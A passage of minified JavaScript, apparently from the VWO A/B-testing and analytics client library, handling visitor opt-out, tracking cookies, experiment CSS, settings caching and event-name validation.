          t = Lt.VISITOR_IS_OPTED_OUT_COMPLETELY, n = !1, o = !1;
          break;
        default:
          t = Lt.VISITOR_IS_NOT_OPTED_OUT, n = !0, o = !0;
      }
      window.VWO.phoenix && window.fetcher.setValue("window.VWO._.optOutStates", {
        state: t,
        executeLib: n,
        shouldWeTrackVisitor: o
      }), window.VWO._.optOutStates = {
        state: t,
        executeLib: n,
        shouldWeTrackVisitor: o
      };
    }
    callStopAnalyzeAndSurvey() {
      window.VWO._.optOutStates.shouldWeTrackVisitor || (window.VWO._.isWorkerThread ? window.fetcher.getValue("window.VWO.modules.otherLibDeps.stopAnalyzeAndSurvey") : window.VWO.modules.otherLibDeps.stopAnalyzeAndSurvey());
    }
    getOptOutStateConfig() {
      return window.VWO._.optOutStates;
    }
    shouldExecuteLibOnBasisOfCurrentOptOutState() {
      return !(!ke() && !window._vis_debug) || (this.getOptOutStateConfig().executeLib || window._removeVwoGlobalStyle(), this.getOptOutStateConfig().executeLib);
    }
    shouldWeTrackVisitor() {
      return !(!ke() && !window._vis_debug) || this.getOptOutStateConfig().shouldWeTrackVisitor;
    }
    isVisitorOptedOut() {
      return !ke() && !window._vis_debug && this.getOptOutStateConfig().state !== Lt.VISITOR_IS_NOT_OPTED_OUT;
    }
  }
  const xt = new Dt();
  function Ut(e) {
    return d(this, void 0, void 0, function* () {
      yield O.phoenix('store.actions.addValues("${{1}}", "${{2}}" )', null, {
        captureGroups: [e, "vwoInternalProperties"]
      });
    });
  }
  class kt extends ht {
    constructor() {
      super(...arguments), this.loadScriptLoadedScripts = {}, this.noopFn = () => {};
    }
    deleteAllCss() {
      const e = document.getElementById("_vis_opt_path_hides");
      e && e.parentNode.removeChild(e);
    }
    getUUID(e) {
      e = e || {}, this.uuid = De.vwoUUID;
      const t = e && e.id && e.multiple_domains && Re.get("_vwo_uuid_" + e.id) || Re.get("_vwo_uuid");
      return this.uuid = t || this.uuid || this.generateUUID();
    }
    createUUIDCookie2(e) {
      if (xt.isVisitorOptedOut()) return;
      const t = this.getUUID(e),
        n = e && e.id && e.multiple_domains ? "_" + e.id : "";
      return Re.get("_vwo_uuid" + n) || this.createCookieMT("_vwo_uuid" + n, t, ft.UUID_COOKIE_EXPIRY, e), O.data = O.data || {}, O.data.vin = O.data.vin || {}, O.data.vin.uuid = t, t;
    }
    extraData2(e) {
      var t,
        n,
        o,
        i,
        r = {},
        s = O.modules.tags.sessionInfoService.getInfo(),
        a = e ? s.r : Pe.get();
      const c = window.screen.width,
        d = window.screen.height;
      return r.sr = c + "x" + d, r.sc = window.screen.colorDepth, r.de = document.characterSet || document.charset, r.ul = window.navigator.language.toLocaleLowerCase(), r.r = a, r.lt = new Date().getTime(), r.tO = st(), r.tz = (null === (i = null === (o = null === (n = null === (t = null === Intl || void 0 === Intl ? void 0 : Intl.DateTimeFormat) || void 0 === t ? void 0 : t.call(Intl)) || void 0 === n ? void 0 : n.resolvedOptions) || void 0 === o ? void 0 : o.call(n)) || void 0 === i ? void 0 : i.timeZone) || "", JSONStringify(r);
    }
    isBotScreen() {
      return +(screen.height - window.innerHeight < 0);
    }
    createCookie(e, t, n, o, i) {
      return d(this, void 0, void 0, function* () {
        return this.otherSide('createCookie("${{1}}", "${{2}}", "${{3}}", "${{4}}", "${{5}}")', null, [null, t, n, o, i]);
      });
    }
    createCookieMT(e, t, n, o) {
      this.shouldTrackUserForCampaign(o) && (o && o.multiple_domains ? Re.createThirdParty(e, t, n, void 0, o.id, void 0, o) : Re.create(e, t, n));
    }
    setTPCJarValue(e, t, n, o, i, r) {
      Re.setThirdPartyCookiesInJar(e, t, n, i), this.__vwoCookie = Re.getThirdPartyJarValue(), this.dTP = this.dTP || At(() => window.VWO._.cookies.createThirdParty.call(window.VWO._.cookies, "_vwo", this.__vwoCookie, this.TPJarExpiry, void 0, void 0, void 0, r), 50), this.__vwoCookie && this.dTP();
    }
    isSSApp({
      getters: e,
      vwoEvents: t
    }) {
      var n;
      const o = O._.sstd;
      if (!o) return !1;
      if (e.vwoInternalProperties.ssdm) return O.data.sst && e.vwoInternalProperties.ssdm;
      try {
        let t = null === (n = e.document.domain) || void 0 === n ? void 0 : n.match(o);
        if (t = window.document.domain.match(o), t && t.length > 0) return O.data.sst;
      } catch (e) {
        return t.trigger(Ke.ERROR, {
          msg: `Invalid regex for domain. sstd = ${O._.sstd}`,
          source: encodeURIComponent(`Invalid regex for domain. VWO._.sstd = ${O._.sstd}`)
        }), !1;
      }
    }
    doesUuidCookiesExist() {
      return !!Re.get("_vwo_uuid") || !!ot(document.cookie.split(";"), function (e) {
        return 0 === e.trim().indexOf("_vwo_uuid_") && 0 !== e.trim().indexOf("_vwo_uuid_v2");
      }).length;
    }
    doNotTrack(e) {
      if (e.settings.vwoData.dntEnabled) return "yes" === e.navigator.doNotTrack || "1" == e.navigator.doNotTrack || "1" == e.navigator.msDoNotTrack || "1" == e.doNotTrack;
    }
    isGloballyOptedOut() {
      return !!parseInt(Re.get(ft.GLOBAL_OPT_OUT, !0), 10);
    }
    _optOut(e, t) {
      return t.trigger(Ke.OPT_OUT, {
        oldArgs: [!1]
      }), !1;
    }
    doesSessionBasedCampaignExistsInTags(e) {
      var t = e && mt(e),
        n = 0,
        o = t && "object" == typeof t && t.si;
      if (o && "object" == typeof o) for (var i in o) if (o.hasOwnProperty(i) && (n = this.isSessionBasedCampaign2(window._vwo_exp[i]) ? 1 : 0)) return n;
      return n;
    }
    delCSS({
      ruleName: e,
      campaignData: t
    }) {
      if ("string" != typeof e) return;
      let n, o, i, r, s, a, c;
      if (e = e.toLowerCase(), t) {
        const e = "_vis_opt_path_hides_" + t.id,
          o = t.variation ? e + "_" + t.variation : e;
        n = document.getElementById(o);
        let i = "";
        (window._vwo_acc_id > 742099 || 718480 === window._vwo_acc_id) && (i = "-webkit-transform:none;-ms-transform:none;transform:none;"), c = `{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;${i}}`;
      } else n = window._vwo_style || document.getElementById("_vis_opt_path_hides"), c = window._vwo_css;
      if (n) {
        if (n) if (n.sheet) {
          n.styleSheet || (e = e.replace(/\*:/g, ":")), o = n.sheet, i = o.cssRules.length && o.cssRules[0].selectorText ? o.cssRules[0].selectorText.toLowerCase().split(",") : "", r = "";
          let t = 0;
          for (s = 0; s < i.length; s++) vwo_$.trim(i[s]) !== e || t ? r += i[s] + "," : t || (t = 1);
          if (r && t) {
            r = r.substr(0, r.length - 1);
            try {
              o.insertRule(r + c, 1);
            } catch (e) {} finally {
              o.deleteRule(0);
            }
          } else n && n.parentNode && n.parentNode.removeChild(n);
        } else if (n.styleSheet) {
          o = n.styleSheet, s = 0;
          do {
            a = o.rules[s], a && a.selectorText.toLowerCase() === e ? o.removeRule(s) : s++;
          } while (a);
        }
        "*" != e || t || (window.VWO.dNR = 1), Rt.mark(`el-${e}-shown`), Rt.measure(`elHidden-${e}`, `el-${e}-hidden`, `el-${e}-shown`), window.fetcher.getValue('phoenix.trigger("${{1}}","${{2}}")', null, {
          captureGroups: [Ke.DELETE_CSS_RULE, {
            oldArgs: [e]
          }]
        });
      }
    }
    insertCSS(e, t) {
      let n, o;
      "object" != typeof e || e instanceof Array || (n = e, e = n.id, o = n.className);
      let i = document.getElementById(e);
      if (i) try {
        i.removeChild(i.childNodes[0]);
      } catch (e) {} else {
        const t = document.getElementsByTagName("head")[0];
        i = document.createElement("style"), e && i.setAttribute("id", e), o && i.setAttribute("class", o), i.setAttribute("type", "text/css"), t.appendChild(i);
      }
      if (i.styleSheet) i.styleSheet.cssText = t;else {
        const e = document.createTextNode(t);
        i.appendChild(e);
      }
    }
    isCustomEvent(e) {
      return e && "string" == typeof e && e.startsWith(je);
    }
    removeCampaignLevelStyleTag(e) {
      var t = document.getElementById("_vis_opt_path_hides_" + e);
      t && t.parentNode && t.parentNode.removeChild(t);
    }
    loadScript(e, t) {
      if (this.loadScriptLoadedScripts[e]) return void t();
      this.loadScriptLoadedScripts[e] = 1;
      const n = document.createElement("script");
      n.src = e, /\/web\/.*\/tag-/.test(e) && (n.crossOrigin = "anonymous"), n.type = "text/javascript", t = t || this.noopFn, n.onerror = function () {
        t();
      }, document.getElementsByTagName("head")[0].appendChild(n), n.parentNode ? n.parentNode.removeChild(n) : window.setTimeout(function () {
        n.parentNode && n.parentNode.removeChild(n);
      }, 100);
    }
    setCampaignIds(e) {
      window._vwo_exp_ids = window._vwo_exp_ids || [], e = e || [], window._vwo_exp_ids.push(...e), Ut({
        experimentIds: window._vwo_exp_ids
      });
    }
    getSplitDecision(e) {
      return Re.get("_vis_opt_exp_" + e + "_split");
    }
    isCookieLessModeEnabled() {
      var e, t, n;
      if (!window.workerThread) {
        window.parent, window.self, null === (n = null === (t = null === (e = window.VWO._.allSettings.dataStore) || void 0 === e ? void 0 : e.plugins) || void 0 === t ? void 0 : t.DACDNCONFIG) || void 0 === n || n.CKLV;
        return !1;
      }
      return !1;
    }
    shouldStopExecWhenSsmNotFound() {
      if ("https:" === window.location.protocol) return !1;
      Re.create("_vwo_ssm", 1, 3650, void 0, void 0, !0);
      const e = Re.get("_vwo_ssm", !0);
      return Re.erase("_vwo_ssm", void 0, !0), !e;
    }
    areCookiesDisabled(e) {
      let t = !1;
      e && !Re.get(ft.TEST_COOKIE, !0) && (t = !0), t && Re.create(ft.TEST_COOKIE, "1", void 0, void 0, void 0, !0);
      const n = !Re.get(ft.TEST_COOKIE, !0);
      return t && Re.create(ft.TEST_COOKIE, "", -1, void 0, void 0, !0), n;
    }
    updateGlobalOptOutCookie(e) {
      e ? Re._create(ft.GLOBAL_OPT_OUT, 1, 100, window._vwo_cookieDomain, void 0, !0) : Re.erase(ft.GLOBAL_OPT_OUT, window._vwo_cookieDomain, !0);
    }
    syncThirdPartyGlobalCookies() {
      var e,
        t = null === (e = window.VWO.data.accountJSInfo) || void 0 === e ? void 0 : e.tpc;
      for (var n in t) t.hasOwnProperty(n) && n === ft.GLOBAL_OPT_OUT && this.updateGlobalOptOutCookie(!!parseInt(t[n], 10));
    }
    removeGlobalStyle() {
      const e = window._vwo_style || document.getElementById("_vis_opt_path_hides");
      e && e.parentNode && e.parentNode.removeChild(e);
    }
    filterEventObjectForWT(e) {
      const t = {};
      return Object.keys(e).forEach(n => {
        try {
          JSONStringify(e[n]);
        } catch (e) {
          return;
        }
        t[n] = e[n];
      }), t;
    }
    syncCachedSettingsInSessionStorage() {
      const e = `_vwo_${window._vwo_acc_id}_settings`,
        t = {};
      return window.sessionStorage.getItem(e) && (t[e] = !0), t;
    }
    getSelectedVariationForPreviewMode(e) {
      let t = null;
      if (e.debug && (t = e.debug.v, -1 === window.name.indexOf(`_vis_preview_${window._vwo_acc_id}`))) {
        let n = Re.get("_vis_preview_" + window._vwo_acc_id);
        if (n) try {
          n = JSON.parse(n);
          const o = e.id;
          n && n[o] && (!e.debug.ts || n[o].ts > e.debug.ts) && (t = n[o].v || t);
        } catch (e) {}
      }
      return t;
    }
    setOnLocalStorageOnBothThreads(e, t, n = []) {
      if ("object" != typeof t || null === t) return;
      let o = window.localStorage.getItem(e),
        i = null;
      if (o) {
        try {
          o = JSON.parse(o) || {};
        } catch (e) {
          o = {};
        }
        for (const e in t) n.includes(e) && Object.prototype.hasOwnProperty.call(o, e) && delete t[e];
        i = JSONStringify(Object.assign(o, t));
      } else i = JSONStringify(t);
      i && (window.fetcher.getValue('window.localStorage.setItem("${{1}}", "${{2}}")', null, {
        captureGroups: [e, i]
      }), window.localStorage.setItem(e, i));
    }
  }
  const Wt = new kt();
  window.VWO.modules.utils.libUtils = Wt;
  class Mt {
    constructor() {
      this.settingsKey = `_vwo_${De.accountId}_settings`, this.configKey = `_vwo_${De.accountId}_config`, this.CACHING_DELAY = 2e3, this.storageNamesForWT = [`window.localStorage.value.${this.settingsKey}`, `window.cachedSettingsInSessionStorage.${this.settingsKey}`], this.smartCodeVersion = window._vwo_code && _vwo_code.getVersion && _vwo_code.getVersion(), this.smartCodeConfig = this.getAndUpdateSmartCodeConfig(), this.cachingConfig = this.getCachingConfig();
    }
    initializeCaching() {
      2 !== this.smartCodeVersion && this.cachingConfig.cache ? setTimeout(this.syncSettings.bind(this), this.CACHING_DELAY) : 0 === this.cachingConfig.cache && this.flushCache();
    }
    getCachingConfig() {
      var e, t, n, o, i;
      const r = (null === (e = this.smartCodeConfig) || void 0 === e ? void 0 : e.stT) || "local",
        s = (null === (t = this.smartCodeConfig) || void 0 === t ? void 0 : t.sL) || 2;
      return {
        stT: r,
        ttl: (null === (n = this.smartCodeConfig) || void 0 === n ? void 0 : n.ttl) || 6e5,
        sL: s,
        cache: null !== (i = null === (o = this.smartCodeConfig) || void 0 === o ? void 0 : o.cache) && void 0 !== i ? i : this.isCachingByDefault()
      };
    }
    isCachingByDefault() {
      return 0;
    }
    getAndUpdateSmartCodeConfig() {
      const e = window.VWO._.allSettings.dataStore.plugins.DACDNCONFIG;
      let t = null == e ? void 0 : e.SCC;
      if (t) try {
        t = JSON.parse(t);
        const {
          sT: e,
          hE: n,
          hES: o,
          stT: i
        } = t;
        return this.smartCodeVersion >= 2 && window.localStorage.setItem(this.configKey, JSONStringify({
          sT: e,
          hE: n,
          hES: o,
          stT: i
        })), t;
      } catch (e) {}
    }
    syncSettings() {
      return d(this, void 0, void 0, function* () {
        const e = De.accountId,
          t = Wt.getCombinationCookie(),
          n = "https://dev.visualwebsiteoptimizer.com/j.php?a=" + e + "&u=" + encodeURIComponent(document.URL) + "&type=sync" + (t ? "&c=" + t : "");
        try {
          const e = yield fetch(n);
          if (200 == e.status) {
            const t = yield e.text();
            t && this.setSettings(t);
          }
        } catch (e) {}
      });
    }
    flushCache() {
      window.localStorage.removeItem(this.settingsKey), window.sessionStorage.removeItem(this.settingsKey);
    }
    getKBSize(e) {
      return Math.floor(new Blob([e]).size) / 1024;
    }
    setSettings(e) {
      try {
        const {
            stT: t,
            ttl: n,
            sL: o
          } = this.cachingConfig,
          i = "local" === t ? window.localStorage : window.sessionStorage,
          r = "local" === t ? this.storageNamesForWT[0] : this.storageNamesForWT[1];
        if (this.getKBSize(e) > 1e3 * o) return void this.flushCache();
        const s = {
          s: e,
          e: new Date().getTime() + n
        };
        i.setItem(this.settingsKey, JSONStringify(s)), window.fetcher.setValue(r, !0);
      } catch (e) {
        "QuotaExceededError" === e.name && this.flushCache();
      }
    }
  }
  const Gt = new Mt(),
    $t = Gt.initializeCaching.bind(Gt);
  window.VWO.modules.settingsCaching = {
    initializeCaching: $t
  };
  class Ft {
    mergeNestedObjects(...e) {
      return e.reduce((e, t) => this.recursivelyMerge(e, t));
    }
    createNestedObjects(e, t) {
      let n = e;
      return t && t.split(".").forEach(e => {
        Object.prototype.hasOwnProperty.call(n, e) || (n[e] = {}), n = n[e];
      }), n;
    }
    clearNestedObject(e, t) {
      let n = e;
      const o = t.split("."),
        i = o[o.length - 1];
      for (let e = 0; e < o.length - 1; e++) n = n[o[e]];
      de(n[i]) ? n[i] = {} : delete n[i];
    }
    recursivelyMerge(e, t, n = {}) {
      if (de(e) && de(t)) {
        const o = {};
        Object.keys(e).concat(Object.keys(t)).forEach(e => {
          o[e] = 1;
        });
        const i = Object.getOwnPropertyDescriptors(e),
          r = Object.getOwnPropertyDescriptors(t);
        return Object.keys(o).forEach(o => {
          r[o] ? Object.defineProperty(n, o, r[o]) : Object.defineProperty(n, o, i[o]), this.recursivelyMerge(e[o], t[o], n[o]);
        }), n;
      }
      return t || e;
    }
  }
  var jt = new Ft();
  const Bt = function (e) {
    let t, n, o;
    t = e.toString(), ((n = t.match(/^(?:async\s+)?([A-Za-z0-9_$]*)\s*=>/)) || (n = t.match(/^(?:async\s+)?\((.*)\)\s*=>/)) || (n = t.match(/^(?:async\s+)?function(?:\s+[A-Za-z_$]*)?\s*\((.*)\)\s*{/))) && (o = n[1]);
    const i = {};
    let r = !1;
    return o.split(",").forEach((e, t) => {
      "vwo_$" === e.trim() && (i[t] = window.vwo_$, r = !0);
    }), r ? function (...t) {
      return Object.keys(i).forEach(e => {
        +e < t.length && (t[e] = i[e]);
      }), e(...t);
    } : e;
  };
  var Ht = {};
  function Kt(e, t) {
    const n = window.VWO._.allSettings.dataStore.campaigns || {};
    if (Object.hasOwnProperty.call(n, e)) {
      if (Re.get("_vis_opt_exp_" + e + "_combi")) return delete Ht[e], !0;
      const o = n[e].combs || {};
      if (Object.hasOwnProperty.call(o, t)) for (const e in o) Object.hasOwnProperty.call(o, e) && (o[e] = e === t ? 1 : 0);
      return delete Ht[e], !0;
    }
    return !1;
  }
  function Jt(e) {
    if (!window._vis_debug && !ke()) if (Array.isArray(e) && e.length) for (const t of e) {
      const {
        e: e,
        v: n
      } = t;
      Kt(e, n) || (Ht[e] = n);
    } else for (const e in Ht) Object.hasOwnProperty.call(Ht, e) && Kt(e, Ht[e]);
  }
  var Yt = function () {};
  function qt(e) {
    window.vwo_iehack_queue || (window.vwo_iehack_queue = []), window.vwo_iehack_queue.push(e);
  }
  function Xt(e, t, n, o = !1) {
    var i, r;
    if (o || xt.shouldWeTrackVisitor()) {
      var s,
        a = new Image();
      t = t || Yt, n = n || Yt, a.onload = function () {
        s || (s = 1, t());
      }, a.onerror = function () {
        s || (s = 1, n());
      }, e.serverUrl = (null === (r = null === (i = window.VWO.data) || void 0 === i ? void 0 : i.accountJSInfo) || void 0 === r ? void 0 : r.collUrl) || e.serverUrl || window._vwo_server_url;
      var c = e.serverUrl + e.url + "&vn=" + e.vn + "&vns=" + e.vns + "&vno=" + e.vno + "&eTime=" + rt() + "&v=" + window.VWO.v_e;
      e.url.indexOf("&cu=") < 0 && e.url.indexOf("&url=") < 0 && (c += "&_cu=" + encodeURIComponent(document.URL.slice(0, 100))), document.referrer && e.url.indexOf("&ru=") < 0 && (c += "&_ru=" + encodeURIComponent(document.referrer.slice(0, 100))), c += "&random=" + Math.random(), a.src = c, qt(a);
    }
  }
  window.VWO.modules.vwoUtils.sendCall = Xt;
  var zt = {};
  const Zt = function (e, t) {
    this.dependencies = {}, this.callback = e, this.name = t;
  };
  Zt.prototype.add = function (e) {
    e && (this.dependencies[e] = 0);
  }, Zt.prototype.unResolve = function (e) {
    if (e) for (var t in this.dependencies) this.dependencies.hasOwnProperty(t) && t === e && (this.remove(e), this.add(e));
  }, Zt.prototype.resolve = function (e) {
    if (e) {
      for (var t in this.dependencies) this.dependencies.hasOwnProperty(t) && t === e && (this.dependencies[t] = 1);
      this.canResolve(this.dependencies) && this.callback();
    }
  }, Zt.prototype.remove = function (e) {
    delete this.dependencies[e];
  }, Zt.prototype.canResolve = function () {
    for (var e in this.dependencies) if (this.dependencies.hasOwnProperty(e) && !this.dependencies[e]) return !1;
    return !0;
  };
  const Qt = {
    init: function (e, t) {
      var n = new Zt(e, t);
      return t && (zt[t] = n), n;
    },
    getDependencyManager: function (e) {
      return zt[e];
    }
  };
  let en = 3,
    tn = 50,
    nn = window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com/",
    on = {
      TPC_SUPPORT_DETECTION_FAILED: "TPC_SUPPORT_DETECTION_FAILED",
      TPC_NOT_SUPPORTED: "TPC_NOT_SUPPORTED",
      LOCAL_OPT_OUT_PARTIALLY_FAILED: "LOCAL_OPT_OUT_PARTIALLY_FAILED",
      GLOBAL_OPT_OUT_DETECTON_FAILED: "GLOBAL_OPT_OUT_DETECTON_FAILED",
      GLOBAL_OPT_OUT_PARTIALLY_FAILED: "GLOBAL_OPT_OUT_PARTIALLY_FAILED"
    },
    rn = {
      GLOBAL_OPT_OUT: "_vwo_global_opt_out",
      OPT_OUT: "_vis_opt_out",
      UUID: "_vwo_uuid",
      UUID_V2: "_vwo_uuid_v2",
      _VIS_OPT_: "_vis_opt_",
      _VWO_: "_vwo_"
    },
    sn = function () {},
    an;
  const cn = function (e, t) {
      const n = document.createElement("script"),
        o = 100 * Math.random(),
        i = "jsonpCallback" + parseInt(o, 10),
        r = document.getElementsByTagName("head")[0];
      window[i] = function (e) {
        delete window[i], r.removeChild(n), t(e);
      }, n.src = e + "?callback=" + i + "&random=" + Math.random(), r.appendChild(n);
    },
    dn = {
      init: function (e) {
        e && (dn.options = e, dn.serverUrl = nn, e.exG ? (an = Qt.init(function () {
          e.success(un);
        }, "optOutDM"), an.add("thirdPartyCookieSupport"), an.add("globalOptOutStatus"), un.isThirdPartyCookiesSupported({
          success: function (t) {
            t ? an.resolve("thirdPartyCookieSupport") : e.error({
              errorType: on.TPC_NOT_SUPPORTED
            });
          },
          error: function () {
            e.error({
              errorType: on.TPC_SUPPORT_DETECTION_FAILED
            });
          }
        }), un.checkGlobalOptOutStatus({
          success: function () {
            an.resolve("globalOptOutStatus");
          },
          error: function () {
            e.error({
              errorType: on.GLOBAL_OPT_OUT_DETECTON_FAILED
            });
          }
        })) : (ln.isOptedOut = ln.checkOptOutStatus(), e.success(ln)));
      },
      process: function (e, t) {
        const n = Re.get(rn.OPT_OUT, !0),
          o = window.location.href.indexOf("vwo_disable_alert") > -1;
        if (n || window.location.href.indexOf("vwo_opt_out=1") > -1) return n || o || alert("You have successfully opted out of VWO for this website."), ln.isOptedOut = !0, "0" !== n && ("2" !== n ? dn.optOut(e, t) : wn(), !0);
      },
      optOut: function (e, t) {
        if (!e) return;
        xt.callStopAnalyzeAndSurvey(), e.domain || (e.domain = window._vwo_cookieDomain), (t = t || {}).success = t.success || sn, t.error = t.error || sn;
        const n = e.optOutExpiry || 3650,
          o = Re.get(rn.OPT_OUT, !0);
        if (e.config && e.config.maintainExperiences) return Re.create(rn.OPT_OUT, 0, n, e.domain, void 0, !0), void xt.setOptOutStateConfig();
        o && "0" !== o || (Re.create(rn.OPT_OUT, 1, 100, e.domain, void 0, !0), xt.setOptOutStateConfig()), e.url = "cdc?cookies=" + JSONStringify([{
          name_regex: "_vwo_uuid_*",
          isDeleted: 1
        }]) + "&accountId=" + e.accountId + "&r=" + Math.random(), e.serverUrl = nn, e.retryRequest = e.retryRequest || 0;
        const i = document.cookie.split(";");
        for (let t = 0; t < i.length; t++) if ((i[t].indexOf(rn._VIS_OPT_) > -1 || i[t].indexOf(rn._VWO_) > -1) && i[t].indexOf(rn.OPT_OUT) < 0) {
          const [n, o] = i[t].split("=");
          n && Re.erase(n.trim(), e.domain, !0);
        }
        wn(), _n(), Xt(e, function () {
          _n(), Re.create(rn.OPT_OUT, 2, 100, e.domain, void 0, !0), window.VWO.phoenix && window.VWO.phoenix("deactivate"), xt.setOptOutStateConfig(), t.success();
        }, function () {
          e.retryRequest++, e.retryRequest <= en ? setTimeout(function () {
            dn.optOut(e, t);
          }, tn) : t.error({
            errorType: on.LOCAL_OPT_OUT_PARTIALLY_FAILED
          });
        }, !0);
      },
      updateGlobalOptOutState: function (e, t) {
        dn.options = e, un.checkGlobalOptOutStatus(t);
      }
    },
    ln = {
      checkOptOutStatus: function () {
        return !!Re.get(rn.OPT_OUT, !0);
      },
      optOut: function (e, t) {
        e ? dn.process(dn.options, t) : (Re.erase(rn.OPT_OUT, dn.options.domain, !0), ln.isOptedOut = !1);
      }
    },
    un = {
      globalOptOut: function (e, t) {
        const n = dn.options,
          o = e ? 1 : 0,
          i = [{
            name: rn.GLOBAL_OPT_OUT,
            value: o,
            isDeleted: 0
          }];
        t = t || {}, n.url = "cdc?cookies=" + JSONStringify(i) + "&accountId=" + n.accountId + "&r=" + Math.random(), n.serverUrl = nn, Xt(n, function () {
          un.isGloballyOptedOut = e, t.success();
        }, function () {
          t.error(on.GLOBAL_OPT_OUT_PARTIALLY_FAILED);
        }, !0);
      },
      checkGlobalOptOutStatus: function (e) {
        (e = e || {}).success = e.success || sn, e.error = e.error || sn, un.isThirdPartyCookiesSupported({
          success: function (t) {
            un.isGloballyOptedOut = !!t && !!parseInt(t[rn.GLOBAL_OPT_OUT], 10), e.success(un.isGloballyOptedOut);
          },
          error: e.error
        });
      },
      isThirdPartyCookiesSupported: function (e) {
        (e = e || {}).success = e.success || sn, e.error = e.error || sn;
        const t = dn.options.accountId;
        Xt({
          url: "cdc?cookies=" + JSONStringify([{
            name: "_vis_opt_test_cookie",
            value: 1,
            isDeleted: 0
          }]) + "&accountId=" + t + "&r=" + Math.random(),
          serverUrl: nn,
          vn: window.VWO.v_e
        }, function () {
          cn(nn + "cdc", function (n) {
            n && n["_vis_opt_test_cookie_" + t] ? (un.tpc = !0, e.success(n)) : (un.tpc = !1, e.success(un.tpc));
          });
        }, function () {
          e.error({
            errorType: on.TPC_SUPPORT_DETECTION_FAILED
          });
        }, !0);
      }
    };
  function wn() {
    let e = window.VWO._.localStorageService;
    window.VWO._.jar && (window.VWO._.jar.cookies = {}, window.VWO._.jar.syncingOff = !0, window.fetcher.setValue("window.VWO._.jar.syncingOff", !0)), Re.erase("_vwo", window._vwo_cookieDomain, !0), e.deleteItem("_vwo");
    try {
      e.deleteItem("vwoSn"), e.deleteItem("_vwo_nls_q_" + window._vwo_acc_id);
    } catch (e) {}
  }
  function _n() {
    const e = window._vwo_exp_ids || [];
    for (let t = 0; t < e.length; t++) {
      const n = e[t];
      if (n && window._vwo_exp[n]) {
        const e = document.getElementById(`_vis_opt_path_hides_${n}`);
        e && e.parentNode && e.parentNode.removeChild(e);
      }
    }
    window._removeVwoGlobalStyle();
  }
  function gn() {
    const e = window.VWO;
    Re.erase(ft.OPT_OUT, window._vwo_cookieDomain, !0), window.VWO.phoenix && !xt.shouldExecuteLibOnBasisOfCurrentOptOutState() || (xt.setOptOutStateConfig(), e.nls && delete e.nls.stopRecording, e.survey && delete e.survey.stopCollectingData);
  }
  function pn(e = {}) {
    window.VWO.modules.otherLibDeps.stopAnalyzeAndSurvey(), dn.optOut({
      accountId: window._vwo_acc_id,
      config: e
    });
  }
  var hn;
  !function (e) {
    e[e.EVENT = 40] = "EVENT", e[e.ATTRIBUTE = 40] = "ATTRIBUTE";
  }(hn || (hn = {}));
  const vn = {
    EMPTY_EVENT: "Event name cannot be empty!",
    EVENT_MORE_THAN_LIMIT: "Event name should not be greater than 40 characters!",
    EVENT_NOT_STRING: "Invalid event name: event name can only be a string!",
    ATTRIBUTE_MORE_THAN_LIMIT: "Attribute name should not be greater than 40 characters!",
    ATTRIBUTE_NOT_OBJECT: "Invalid attribute type: attribute can only be an object!"
  };
  class fn {
    static toCamelCase(e) {
      return e.replace(/[^\w\s-.][\w]/g, function (e) {
        return e.toUpperCase();
      }).replace(/[^\w\s-.]/g, "").replace(/ [\w]/g, function (e) {
        return e.toUpperCase();
      }).replace(/ /g, "");
    }
    static filterPropertyName(e) {
      let t = fn.toCamelCase(e.slice(e.search(/[\w-.]/g)));
      return t = t.replace(/^(_|vwo_|\.|v_|i_|-)*/g, ""), "props" === t ? "" : t;
    }
    static filterEventName(e) {
      let t = fn.toCamelCase(e.slice(e.search(/[\w-.]/g)));
      return t = t.replace(/^(_|vwo_|\.|v_|i_|-)*/g, ""), "visitors" === t.toLowerCase() && (t += "_1"), t;
    }
    static filterAttributeObjectKeys(e) {
      if ("object" != typeof e || Array.isArray(e)) return fn.logWarningAndReportError(vn.ATTRIBUTE_NOT_OBJECT);
      const t = {};
      for (const n in e) if (Object.prototype.hasOwnProperty.call(e, n)) {
        let o = fn.filterPropertyName(n);
        if (!o.trim()) return fn.logWarningAndReportError(`Invalid attribute name: '${n}' is not allowed as an attribute name!`);
        o.length > 40 && (o = o.slice(0, 40), console.warn(vn.ATTRIBUTE_MORE_THAN_LIMIT));
        const i = de(e[n]) || le(e[n]) ? JSONStringify(e[n]) : e[n];
        ["name", "time"].includes(o) ? (t.conflictingPropsData = t.conflictingPropsData || {}, t.conflictingPropsData[o] = i) : t[o] = i;
      }
      return t;
    }
    static logWarningAndReportError(e) {
      console.log("%cVWO Event API Error:", "font-weight:bold;", e), window.VWO._.customError && window.VWO._.customError({
        msg: "VWO Event API Error: " + e,
        url: "NamingUtil.ts",
        lineno: 80,
        colno: 10
      });
    }
  }
  function En(e, t) {
    const n = (e = -1, t = "") => {
      switch (e) {
        case 0:
          return fn.logWarningAndReportError(vn.EMPTY_EVENT);
        case 1:
          return console.warn(vn.EVENT_MORE_THAN_LIMIT);
        case 2:
          return fn.logWarningAndReportError(`Invalid event name: '${t}' is not allowed as an event name!`);
        default:
          return fn.logWarningAndReportError(vn.EVENT_NOT_STRING);
      }
    };
    if ("string" != typeof e) return n();
    if (!(e = e.trim())) return n(0);
    const o = e;
    if (!(e = fn.filterEventName(e))) return n(2, o);
    e.length > 40 && (n(1), e = e.slice(0, 40));
    const i = fn.filterAttributeObjectKeys(t);
    return i ? {
      eventName: e,
      filteredAttributeObject: i
    } : void 0;
  }
  function mn(e, t, n) {
    const o = window.VWO;
    switch (e.toLowerCase()) {
      case "tags":
        o.phoenix.tags.add(t, n.fn);
        break;
      case "operators":
        o.phoenix.operators.add(n.fn);
        break;
      case "storages":
        o.phoenix.storages.add(n);
        break;
      case "store":
        o.phoenix.store.actions.addValues(n);
    }
  }
  class On {
    constructor(e) {
      if (e instanceof On) return void Object.keys(e).forEach(t => {
        this[t] = e[t];
      });
      this.queue = e.slice(), this._ = e._ || {}, this._.performance = Rt, this._.isWorkerThread = !1, this.nonce = e.nonce, Object.defineProperty(this, "modules", {
        value: e.modules,
        enumerable: !1,
        configurable: !1
